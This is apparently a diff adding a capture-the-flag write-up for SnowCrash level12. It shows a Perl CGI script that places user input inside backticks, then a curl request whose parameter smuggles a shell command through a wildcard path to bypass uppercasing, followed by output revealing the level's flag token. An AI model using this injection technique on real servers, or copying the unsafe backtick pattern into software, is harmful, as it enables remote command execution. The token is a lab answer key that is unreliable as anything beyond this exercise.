@@ -1,0 +1,49 @@
+#we have a perl script on the port 4646: http://10.13.200.62:4646/level12.pl
+#we see that the script uses regex to uppercase the string and another to remove spaces:
+
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+
+#we will create a file in capital letter and call it with the wildcard * in this file we will put our commands:
+level12@SnowCrash:~$ echo "getflag | wall" > /tmp/GETFLAG
+#we send this file as parameter in an url string, it will execute:
+level12@SnowCrash:~$ curl http://10.13.200.62:4646/level12.pl?x='`/*/GETFLAG`'&y=2 2>1
+[1] 29972
+bash: 1: Permission denied
+                                                                               
+Broadcast Message from flag12@Snow                                             
+        (somewhere) at 17:06 ...                                               
+                                                                               
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      
+                                                                               
+..
+
+
+
